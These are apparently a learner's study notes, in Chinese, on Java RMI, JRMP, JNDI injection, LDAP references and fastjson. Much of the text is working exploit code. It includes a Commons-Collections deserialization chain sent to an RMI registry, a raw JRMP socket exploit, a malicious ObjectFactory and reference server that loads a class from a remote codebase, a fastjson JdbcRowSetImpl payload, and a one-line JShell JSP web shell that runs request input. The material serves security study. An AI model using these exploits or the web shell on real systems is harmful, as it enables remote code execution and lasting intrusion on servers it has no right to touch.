- [x] LDAP协议

- [x] JNDI注入中的Reference中的url有什么用?

  ```
  //后面的url相当于是Codebase 记录的是远程class的位置，因为rmi只是传递的序列化数据，没有把class文件传递过来，所以如果没有这个反序列化会失败。
  ```

- [x] https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

  膜拜一下:https://blog.csdn.net/u011721501/article/details/52316225

- [ ] 绕过高版本限制:https://paper.seebug.org/942/

- [ ] 补充:http://tttang.com/archive/1430/

# RMI

`Remote Method Invocation` 远程方法调用，构建分布式应用程序，可以实现java跨`JVM`远程通信

1. `RMI客户端`在调用远程方法时会先创建`Stub(sun.rmi.registry.RegistryImpl_Stub)`。
2. `Stub`会将`Remote`对象传递给`远程引用层(java.rmi.server.RemoteRef)`并创建`java.rmi.server.RemoteCall(远程调用)`对象。
3. `RemoteCall`序列化`RMI服务名称`、`Remote`对象。
4. `RMI客户端`的`远程引用层`传输`RemoteCall`序列化后的请求信息通过`Socket`连接的方式传输到`RMI服务端`的`远程引用层`。
5. `RMI服务端`的`远程引用层(sun.rmi.server.UnicastServerRef)`收到请求会请求传递给`Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)`。
6. `Skeleton`调用`RemoteCall`反序列化`RMI客户端`传过来的序列化。
7. `Skeleton`处理客户端请求：`bind`、`list`、`lookup`、`rebind`、`unbind`，如果是`lookup`则查找`RMI服务名`绑定的接口对象，序列化该对象并通过`RemoteCall`传输到客户端。
8. `RMI客户端`反序列化服务端结果，获取远程对象的引用。
9. `RMI客户端`调用远程方法，`RMI服务端`反射调用`RMI服务实现类`的对应方法并序列化执行结果返回给客户端。
10. `RMI客户端`反序列化`RMI`远程方法调用结果。

可以参考`javasec`总结的rmi的调用流程。(就在上面)

## 0x01 测试代码

服务端需要准备的

```java
package com.anbai.sec.rmi;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServerTest {

	// RMI服务器IP地址
	public static final String RMI_HOST = "127.0.0.1";

	// RMI服务端口
	public static final int RMI_PORT = 9527;

	// RMI服务名称
	public static final String RMI_NAME = "rmi://" + RMI_HOST + ":" + RMI_PORT + "/test";

	public static void main(String[] args) {
		try {
			// 注册RMI端口
			LocateRegistry.createRegistry(RMI_PORT);

			// 绑定Remote对象
			Naming.bind(RMI_NAME, new RMITestImpl());//绑定的remote对象

			System.out.println("RMI服务启动成功,服务地址:" + RMI_NAME);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
```

一个RMI server三部分

- 继承了remote的接口 其中定义我们要远程调用的函数
- 一个实现了这个接口的类
- 主类，来`Registry`，将上面的类实例化绑定

`RMITestImpl`

```java
package com.anbai.sec.rmi;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RMITestImpl extends UnicastRemoteObject implements RMITestInterface {

	private static final long serialVersionUID = 1L;

	protected RMITestImpl() throws RemoteException {
		super();
	}

	/**
	 * RMI测试方法
	 *
	 * @return 返回测试字符串
	 */
	@Override
	public String test() throws RemoteException {
		return "Hello RMI~";
	}

}
```

客户端必须要拿到`RMITestInterface`

```
/**
 * RMI测试接口
 */
public interface RMITestInterface extends Remote {

	/**
	 * RMI测试方法
	 *
	 * @return 返回测试字符串
	 */
	String test() throws RemoteException;

}
```

客户端代码

```java
try {
			// 查找远程RMI服务
			RMITestInterface rt = (RMITestInterface) Naming.lookup(RMI_NAME);

			// 调用远程接口RMITestInterface类的test方法
			String result = rt.test();

			// 输出RMI方法调用结果
			System.out.println(result);
		} catch (Exception e) {
			e.printStackTrace();
		}
```

大概流程就是这样了。

## 0x02 RMI反序列化

exploit： 攻击`RMIRegistryExploit`

```java
package com.anbai.sec.rmi;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.Map;

import static com.anbai.sec.rmi.RMIServerTest.RMI_HOST;
import static com.anbai.sec.rmi.RMIServerTest.RMI_PORT;

/**
 * RMI反序列化漏洞利用，修改自ysoserial的RMIRegistryExploit：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java
 *
 * @author yz
 */
public class RMIExploit {

   // 定义AnnotationInvocationHandler类常量
   public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

   /**
    * 信任SSL证书
    */
   private static class TrustAllSSL implements X509TrustManager {

      private static final X509Certificate[] ANY_CA = {};

      public X509Certificate[] getAcceptedIssuers() {
         return ANY_CA;
      }

      public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

      public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

   }

   /**
    * 创建支持SSL的RMI客户端
    */
   private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {

      public Socket createSocket(String host, int port) throws IOException {
         try {
            // 获取SSLContext对象
            SSLContext ctx = SSLContext.getInstance("TLS");

            // 默认信任服务器端SSL
            ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);

            // 获取SSL Socket连接工厂
            SSLSocketFactory factory = ctx.getSocketFactory();

            // 创建SSL连接
            return factory.createSocket(host, port);
         } catch (Exception e) {
            throw new IOException(e);
         }
      }
   }

   /**
    * 使用动态代理生成基于InvokerTransformer/LazyMap的Payload
    *
    * @param command 定义需要执行的CMD
    * @return Payload
    * @throws Exception 生成Payload异常
    */
   private static InvocationHandler genPayload(String command) throws Exception {
      // 创建Runtime.getRuntime.exec(cmd)调用链
      Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{
                  String.class, Class[].class}, new Object[]{
                  "getRuntime", new Class[0]}
            ),
            new InvokerTransformer("invoke", new Class[]{
                  Object.class, Object[].class}, new Object[]{
                  null, new Object[0]}
            ),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})
      };

      // 创建ChainedTransformer调用链对象
      Transformer transformerChain = new ChainedTransformer(transformers);

      // 使用LazyMap创建一个含有恶意调用链的Transformer类的Map对象
      final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);

      // 获取AnnotationInvocationHandler类对象
      Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);

      // 获取AnnotationInvocationHandler类的构造方法
      Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

      // 设置构造方法的访问权限
      constructor.setAccessible(true);

      // 实例化AnnotationInvocationHandler，
      // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, lazyMap);
      InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

      // 使用动态代理创建出Map类型的Payload
      final Map mapProxy2 = (Map) Proxy.newProxyInstance(
            ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annHandler
      );

      // 实例化AnnotationInvocationHandler，
      // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, mapProxy2);
      return (InvocationHandler) constructor.newInstance(Override.class, mapProxy2);
   }

   /**
    * 执行Payload
    *
    * @param registry RMI Registry
    * @param command  需要执行的命令
    * @throws Exception Payload执行异常
    */
   public static void exploit(final Registry registry, final String command) throws Exception {
      // 生成Payload动态代理对象
      Object payload = genPayload(command);
      String name    = "test" + System.nanoTime();

      // 创建一个含有Payload的恶意map
      Map<String, Object> map = new HashMap();
      map.put(name, payload);

      // 获取AnnotationInvocationHandler类对象
      Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);

      // 获取AnnotationInvocationHandler类的构造方法
      Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

      // 设置构造方法的访问权限
      constructor.setAccessible(true);

      // 实例化AnnotationInvocationHandler，
      // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, map);
      InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
      // 使用动态代理创建出Remote类型的Payload
      Remote remote = (Remote) Proxy.newProxyInstance(
            ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, annHandler
      );
      try {
         // 发送Payload
         registry.bind(name, remote);
      } catch (Throwable e) {
         e.printStackTrace();
      }
   }
   public static void main(String[] args) throws Exception {
      if (args.length == 0) {
         // 如果不指定连接参数默认连接本地RMI服务
         args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), "open -a Calculator.app"};
      }
      // 远程RMI服务IP
      final String host = args[0];
      // 远程RMI服务端口
      final int port = Integer.parseInt(args[1]);
      // 需要执行的系统命令
      final String command = args[2];
      // 获取远程Registry对象的引用
      Registry registry = LocateRegistry.getRegistry(host, port);
      try {
         // 获取RMI服务注册列表(主要是为了测试RMI连接是否正常)
         String[] regs = registry.list();
         for (String reg : regs) {
            System.out.println("RMI:" + reg);
         }
      } catch (ConnectIOException ex) {
         // 如果连接异常尝试使用SSL建立SSL连接,忽略证书信任错误，默认信任SSL证书
         registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
      }
      // 执行payload
      exploit(registry, command);
   }


```

攻击流程的话就是

1. 首先创建一个Stub对象`LocateRegistry.getRegistry(host, port);`
2. 构造一个cc链的反序列化利用链子
3. 调用服务端的rmi指令 `registry.bind(name, remote);`
4. 服务端接收到请求后，反序列化我们传递过去的对象触发链子。

## 0x03 JRMP

`JRMP`接口的两种常见实现方式：

1. `JRMP协议(Java Remote Message Protocol)`，`RMI`专用的`Java远程消息交换协议`。
2. `IIOP协议(Internet Inter-ORB Protocol)` ，基于 `CORBA` 实现的对象请求代理协议。

然后就是上面放出来的攻击流程，相当于换了个小协议?

```java
package com.anbai.sec.rmi;

import sun.rmi.server.MarshalOutputStream;
import sun.rmi.transport.TransportConstants;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;

import static com.anbai.sec.rmi.RMIServerTest.RMI_HOST;
import static com.anbai.sec.rmi.RMIServerTest.RMI_PORT;

/**
 * 利用RMI的JRMP协议发送恶意的序列化包攻击示例，该示例采用Socket协议发送序列化数据，不会反序列化RMI服务器端的数据，
 * 所以不用担心本地被RMI服务端通过构建恶意数据包攻击，示例程序修改自ysoserial的JRMPClient：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java
 */
public class JRMPExploit {

   public static void main(String[] args) throws IOException {
      if (args.length == 0) {
         // 如果不指定连接参数默认连接本地RMI服务
         args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), "open -a Calculator.app"};
      }

      // 远程RMI服务IP
      final String host = args[0];

      // 远程RMI服务端口
      final int port = Integer.parseInt(args[1]);

      // 需要执行的系统命令
      final String command = args[2];

      // Socket连接对象
      Socket socket = null;

      // Socket输出流
      OutputStream out = null;

      try {
         // 创建恶意的Payload对象
         Object payloadObject = RMIExploit.genPayload(command);

         // 建立和远程RMI服务的Socket连接
         socket = new Socket(host, port);
         socket.setKeepAlive(true);
         socket.setTcpNoDelay(true);

         // 获取Socket的输出流对象
         out = socket.getOutputStream();

         // 将Socket的输出流转换成DataOutputStream对象
         DataOutputStream dos = new DataOutputStream(out);

         // 创建MarshalOutputStream对象
         ObjectOutputStream baos = new MarshalOutputStream(dos);

         // 向远程RMI服务端Socket写入RMI协议并通过JRMP传输Payload序列化对象
         dos.writeInt(TransportConstants.Magic);// 魔数
         dos.writeShort(TransportConstants.Version);// 版本
         dos.writeByte(TransportConstants.SingleOpProtocol);// 协议类型
         dos.write(TransportConstants.Call);// RMI调用指令
         baos.writeLong(2); // DGC
         baos.writeInt(0);
         baos.writeLong(0);
         baos.writeShort(0);
         baos.writeInt(1); // dirty
         baos.writeLong(-669196253586618813L);// 接口Hash值

         // 写入恶意的序列化对象
         baos.writeObject(payloadObject);

         dos.flush();
      } catch (Exception e) {
         e.printStackTrace();
      } finally {
         // 关闭Socket输出流
         if (out != null) {
            out.close();
         }

         // 关闭Socket连接
         if (socket != null) {
            socket.close();
         }
      }
   }

}
```

> 感觉大概流程 听明白，但是还是没太懂，可能是版本原因，他的链子，我并没有测试成功，看完，封装一个cc6试一试。我的bind方法报错了，不知道为什么？。

## 0x04 tips

- RMI传输都是基于反序列化的
- 对于任何一个以对象为参数的RMI接口，你都可以传递一个自己构建的对象，迫使这个服务器端将这个对象按任何一个存在的`classpath`来序列化恢复这个类。(可以实现客户端攻击server了

利用这个

![image-20220110172958056](https://img.dem0dem0.top/images/image-20220110172958056.png)

```
Registry registry = LocateRegistry.getRegistry();
        // 获取远程对象的引用
        Services services = (Services) registry.lookup("rmi://127.0.0.1:9999/Services");
        PublicKnown malicious = new PublicKnown();
        malicious.setParam("calc");
        malicious.setMessage("haha");

// 使用远程对象的引用调用对应的方法
System.out.println(services.sendMessage(malicious));
```

这是在攻击**server**,利用的时候挺少的.....

## 0x05 RMI动态加载对象

**java.rmi.server.codebase**: 表示一个或多个url值，可以下载本地找不到的类。

这也是后面JNDI注入利用的主要特点:

如果加载server返回的对象时，发生了报错或者本地没有这个类，rmi就会自动去远程加载这个类，根据`codebase`去下载远程的类来动态加载执行。

### 攻击client

指定`java.rmi.server.codebase`，当客户端，没有指定的类的时候，回去远程加载。



#  JNDI

## 0x01 概述

`JNDI(Java Naming and Directory Interface)`是java提供的命名和目录服务，java可以通过他的API来命令和定位资源。

可以访问的资源有:`DataSource(JDBC 数据源)`，`JNDI`可访问的现有的目录及服务有:`JDBC`、`LDAP`、`RMI`、`DNS`、`NIS`、`CORBA`

参考链接:https://blog.csdn.net/ericxyy/article/details/2012287

https://blog.csdn.net/li_w_ch/article/details/110114397

## 0x02 JNDI目录服务和命名服务

JNDI目录服务首先会通过预先设置好的环境变量来进行初始化。如果没有指定话，那么就会按照顺序`系统属性(System.getProperty())`、`applet 参数`和`应用程序资源文件(jndi.properties)`。

初始化代码

```java
// 创建环境变量对象
Hashtable env = new Hashtable();
// 设置JNDI初始化工厂类名
env.put(Context.INITIAL_CONTEXT_FACTORY, "类名");
// 设置JNDI提供服务的URL地址
env.put(Context.PROVIDER_URL, "url");
// 创建JNDI目录服务对象
DirContext context = new InitialDirContext(env);
```

jdni支持的服务

![image-20220106145133187](https://img.dem0dem0.top/images/image-20220106145133187.png)

摘抄师傅的两个实例来体现其作用

dns服务(目录服务)

```java
package com.anbai.sec.jndi;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.Attributes;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;

/**
 * Creator: yz
 * Date: 2019/12/23
 */
public class DNSContextFactoryTest {

   public static void main(String[] args) {
      // 创建环境变量对象
      Hashtable env = new Hashtable();

      // 设置JNDI初始化工厂类名
      env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.dns.DnsContextFactory");

      // 设置JNDI提供服务的URL地址，这里可以设置解析的DNS服务器地址
      env.put(Context.PROVIDER_URL, "dns://223.6.6.6/");

      try {
         // 创建JNDI目录服务对象
         DirContext context = new InitialDirContext(env);

         // 获取DNS解析记录测试
         Attributes attrs1 = context.getAttributes("baidu.com", new String[]{"A"});
         Attributes attrs2 = context.getAttributes("qq.com", new String[]{"A"});

         System.out.println(attrs1);
         System.out.println(attrs2);
      } catch (NamingException e) {
         e.printStackTrace();
      }
   }

}
```

关于ldap的datasource的代码不再看了。

命名服务

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="javax.naming.Context" %>
<%@ page import="javax.naming.InitialContext" %>
<%@ page import="javax.sql.DataSource" %>
<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.ResultSet" %>
<%
    // 初始化JNDIContext
    Context context = new InitialContext();

    // 搜索Tomcat注册的JNDI数据库连接池对象
    DataSource dataSource = (DataSource) context.lookup("java:comp/env/jdbc/test");

    // 获取数据库连接
    Connection connection = dataSource.getConnection();

    // 查询SQL语句并返回结果
    ResultSet rs = connection.prepareStatement("select version()").executeQuery();

    // 获取数据库查询结果
    while (rs.next()) {
        out.println(rs.getObject(1));
    }

    rs.close();
%>
```

`java:comp/env`这是`j2ee`中环境变量的意思

总结一下 大概流程就是

```
//创建环境变量
Hashtable env = new Hashtable();
//设置env
env.put(Context.INITIAL_CONTEXT_FACTORY,"类名");
env.put(key,value)//传入参数
DirContext context = new InitialDirContext(env);
context就变成你想要的服务类，怎么操作就怎么操作了。
```

## 0x03 协议转换

`JNDI`默认支持自动转换的协议有：

| 协议名称             | 协议URL        | Context类                                               |
| -------------------- | -------------- | ------------------------------------------------------- |
| DNS协议              | `dns://`       | `com.sun.jndi.url.dns.dnsURLContext`                    |
| RMI协议              | `rmi://`       | `com.sun.jndi.url.rmi.rmiURLContext`                    |
| LDAP协议             | `ldap://`      | `com.sun.jndi.url.ldap.ldapURLContext`                  |
| LDAP协议             | `ldaps://`     | `com.sun.jndi.url.ldaps.ldapsURLContextFactory`         |
| IIOP对象请求代理协议 | `iiop://`      | `com.sun.jndi.url.iiop.iiopURLContext`                  |
| IIOP对象请求代理协议 | `iiopname://`  | `com.sun.jndi.url.iiopname.iiopnameURLContextFactory`   |
| IIOP对象请求代理协议 | `corbaname://` | `com.sun.jndi.url.corbaname.corbanameURLContextFactory` |

```java
// 创建JNDI目录服务上下文
InitialContext context = new InitialContext();

// 查找JNDI目录服务绑定的对象
Object obj = context.lookup("rmi://127.0.0.1:9527/test");
```

## 0x04 Reference

在`RMI`服务中引用远程对象将受本地Java环境限制即本地的`java.rmi.server.useCodebaseOnly`配置必须为`false(允许加载远程对象)`，如果该值为`true`则禁止引用远程对象。除此之外被引用的`ObjectFactory`对象还将受到`com.sun.jndi.rmi.object.trustURLCodebase`配置限制，如果该值为`false(不信任远程引用对象)`一样无法调用远程的引用对象。

> 摘抄自大佬的文章https://zhishihezi.net/endpoint/richtext/96669a642bbffc95aad53e1165cb0708?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d0052ac2bc129e1cd21d710d012fe32e886817369cd589da79a72c08cd418002d30f0b97067ce7fa98aa1216f40db62f3824f104b99448d620a85e0d31ec883ce32ffbce42cb5f49bbd72abd772c66cd62219bec9aa1aafd229b8d42b0b6261f2fd29aa21b50a5cf60e897f803153b75e49a11e52f83e3862650116ae667b59ca4d87fd25ff5ec5d70355dbeebae2436d51fd915fd99703cf15da64cb50a5dc7a026e5cb7bd365df025f907107c5fd874bd51881666c05de390a7514eb8bab99e72#3

要更改这些配置，两种方式

- -D参数
- System.setProperty

绕过高版本限制:https://paper.seebug.org/942/

他使用一个打印机的案例很tm详细:

> 如果打印服务将打印机的名称绑定到Reference,那么就可以使用这个reference来创建一个打印机对象，并且调用他的方法

对象工厂必须实现 `javax.naming.spi.ObjectFactory`接口并重写`getObjectInstance`方法。主要就是因为允许`ObjectFactory`加载外部对象。

下面来看一个恶意的RMI服务

factor:

```java
package com.anbai.sec.jndi.injection;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * 引用对象创建工厂
 */
public class ReferenceObjectFactory implements ObjectFactory {

	/**
	 * @param obj  包含可在创建对象时使用的位置或引用信息的对象（可能为 null）。
	 * @param name 此对象相对于 ctx 的名称，如果没有指定名称，则该参数为 null。
	 * @param ctx  一个上下文，name 参数是相对于该上下文指定的，如果 name 相对于默认初始上下文，则该参数为 null。
	 * @param env  创建对象时使用的环境（可能为 null）。
	 * @return 对象工厂创建出的对象
	 * @throws Exception 对象创建异常
	 */
	public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?, ?> env) throws Exception {
		// 在创建对象过程中插入恶意的攻击代码，或者直接创建一个本地命令执行的Process对象从而实现RCE
		return Runtime.getRuntime().exec("calc");
	}
}
```

服务端

```java
// 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
String url = "https://anba1i.io/tools/jndi-test.jar";
// 对象的工厂类名
String className = "com.anbai.sec.jndi.injection.ReferenceObjectFactory";
// 监听RMI服务端口
LocateRegistry.createRegistry(RMI_PORT);
// 创建一个远程的JNDI对象工厂类的引用对象
Reference reference = new Reference(className, className,"http://www.baidu.com");
// 转换为RMI引用对象
ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
// 绑定一个恶意的Remote对象到RMI服务
Naming.bind(RMI_NAME, referenceWrapper);
System.out.println("RMI服务启动成功,服务地址:" + RMI_NAME);
```

如果本地没有 他就会去远程找

LDAP服务大家可以看看师傅的GitHub，就不贴了。

## 0x05 fastjson中的jndi注入

因为还没有彻底去学习fastjson反序列化，这里也只是很简单的说一下关于触发jndi。

```
ring json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:3890/test\", \"autoCommit\": \"true\" }";
```

在这里fastjson会自动创建`com.sun.rowset.JdbcRowSetImpl`，然后调用`set`方法给各个属性赋值，`autoCommit`给这个大哥赋值的时候，就会触发`connect`最后一个`lookup`结束正常战斗。

# LDAP

摘抄:https://paper.seebug.org/1091/#ldap

## 0X01 简介

目录服务

## 0x02 demo

LDAP 的目录信息是以树形结构进行存储的，在树根一般定义国家（c=CN）或者域名（dc=com），其次往往定义一个或多个组织（organization，o）或组织单元（organization unit，ou）。一个组织单元可以包含员工、设备信息（计算机/打印机等）相关信息。例如为公司的员工设置一个DN，可以基于cn或uid（User ID）作为用户账号。如example.com的employees单位员工longofo的DN可以设置为下面这样：

uid=longofo,ou=employees,dc=example,dc=com

## 0x03 其实就和RMI差不多

不说了，这个后面深入研究的时候，过一遍exp再说。

## 0x04 ldap ref利用

这是java对象在ldap编程中的存储方式

![image-20220106182730702](https://img.dem0dem0.top/images/image-20220106182730702.png)

```java
	private static class OperationInterceptor extends InMemoryOperationInterceptor {

		@Override
		public void processSearchResult(InMemoryInterceptedSearchResult result) {
			String base  = result.getRequest().getBaseDN();
			Entry  entry = new Entry(base);

			try {
				// 设置对象的工厂类名
				String className = "com.anbai.sec.jndi.injection.ReferenceObjectFactory";
				entry.addAttribute("javaClassName", className);
				entry.addAttribute("javaFactory", className);

				// 设置远程的恶意引用对象的jar地址
				entry.addAttribute("javaCodeBase", REMOTE_REFERENCE_JAR);

				// 设置LDAP objectClass
				entry.addAttribute("objectClass", "javaNamingReference");

				result.sendSearchEntry(entry);
				result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
			} catch (Exception e1) {
				e1.printStackTrace();
			}
		}

	}
}
```

![image-20220110200719576](https://img.dem0dem0.top/images/image-20220110200719576.png)

# JSHELL

java9之后加入的一个交互式javashell，我们就可以在jsp中利用他来真正实现一句话shell。

```jsp
<%=jdk.jshell.JShell.builder().build().eval(request.getParameter("src")).get(0).value().replaceAll("^\"", "").replaceAll("\"$", "")%>
```

```java
new%20String(Runtime.getRuntime().exec(%22pwd%22).getInputStream().readAllBytes()).exec("pwd").getInputStream().readAllBytes()))
```



>1. https://paper.seebug.org/1091/#jndi
>2. https://paper.seebug.org/1420/#_2
